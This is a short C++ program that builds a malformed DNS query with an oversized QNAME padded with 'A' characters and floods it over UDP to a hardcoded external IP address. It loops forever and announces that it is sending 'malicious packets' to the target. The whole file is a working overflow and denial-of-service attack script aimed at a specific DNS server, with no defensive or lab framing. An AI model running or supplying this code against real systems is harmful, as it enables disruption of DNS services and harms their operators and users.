#include <iostream>
#include <cstring>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>

const int DNS_PORT = 53;
const char* TARGET_IP = "219.216.131.82";  // Set target ip
const int PACKET_SIZE = 512;

void createOverflowPacket(char* buffer) {
    // 设置DNS请求头
    memset(buffer, 0, PACKET_SIZE);

    // index dns buffer pkt 
    buffer[0] = 0xAA;    // ID
    buffer[1] = 0xAA;    // ID
    buffer[2] = 0x01;    // String bit
    buffer[3] = 0x00;    // String bit
    buffer[4] = 0x00;    // Problme NUm high
    buffer[5] = 0x01;    // Problme NUM low
    buffer[12] = 0x00;   // QNAME start bits

    // index out data，add at qname part
    memset(buffer + 13, 'A', PACKET_SIZE - 13);  // Full "A" String
    buffer[PACKET_SIZE - 1] = 0x00;  // Set end string
}

void sendPacket(int sockfd, sockaddr_in &destAddr, const char* buffer) {
    if (sendto(sockfd, buffer, PACKET_SIZE, 0, (struct sockaddr*)&destAddr, sizeof(destAddr)) < 0) {
        perror("Failed to send packet");
    }
}

int main() {
    int sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sockfd < 0) {
        perror("Socket creation failed");
        return 1;
    }

    sockaddr_in destAddr;
    memset(&destAddr, 0, sizeof(destAddr));
    destAddr.sin_family = AF_INET;
    destAddr.sin_port = htons(DNS_PORT);
    inet_pton(AF_INET, TARGET_IP, &destAddr.sin_addr);

    char buffer[PACKET_SIZE];
    createOverflowPacket(buffer);

    std::cout << "Sending malicious packets continuously to target..." << std::endl;

    while (true) {
        sendPacket(sockfd, destAddr, buffer);
        usleep(50000);  // Set a lag for server block request
    }

    close(sockfd);
    return 0;
}

